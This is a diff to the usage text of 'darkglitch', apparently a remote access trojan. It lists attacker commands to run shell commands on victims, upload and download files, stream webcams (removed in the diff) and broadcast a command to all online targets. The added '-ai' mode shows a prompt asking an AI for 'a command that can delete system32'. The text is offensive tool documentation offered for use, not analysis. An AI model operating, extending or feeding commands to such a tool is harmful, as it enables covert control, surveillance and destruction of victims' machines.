@@ -15,17 +15,13 @@ DESCRIPTION:
 USAGE:
   darkglitch [MODE] [OPTIONS] [ARGUMENTS]
 
-MODES:
-  Victim (Client Mode):
-    darkglitch -l -c                      Listen for connections (command mode)
-    darkglitch -l -s                      Listen for connections (stream mode)
-
-  Attacker (Server Mode):
+MODES::
+    darkglitch -l -b                      Listen for connections (command mode)
     darkglitch -ol                        List all online connected clients
-    darkglitch -c <client_id> <cmd>       Execute command on target
-    darkglitch -s <client_id>             Stream webcam from target
-    darkglitch -u <client_id> <src>       Upload file to target
-    darkglitch -d <client_id> <src>       Download file from target
+    darkglitch -b <client_id> <cmd>       Execute command on target
+    darkglitch -u <client_id> <src> [dst] Upload file to target
+    darkglitch -d <client_id> <src> [dst] Download file from target
+    darkglitch -ai <client_id> <prompt>   Using Prompt to execute command
 
 GENERAL OPTIONS:
   -h, --help                              Display this help message
@@ -39,16 +35,13 @@ ARGUMENTS:
 
 EXAMPLES:
   # Start a client listener
-  darkglitch -l -c
+  darkglitch -l -b
 
   # List all connected clients
   darkglitch -ol
 
   # Execute command on target client
-  darkglitch -c <client_id> "whoami"
-
-  # Stream webcam from target
-  darkglitch -s <client_id>
+  darkglitch -b <client_id> "whoami"
 
   # Upload local file to target
   darkglitch -u <client_id> <src> [dst]
@@ -56,6 +49,9 @@ EXAMPLES:
   # Download file from target
   darkglitch -d <client_id> <src> [dst]
 
+  # All option is to send a command to all available/online targets
+  darkglitch -all "whoami"
+  
   # AI
   darkglitch -ai <client_id> "give me a command that can delete system32"
 
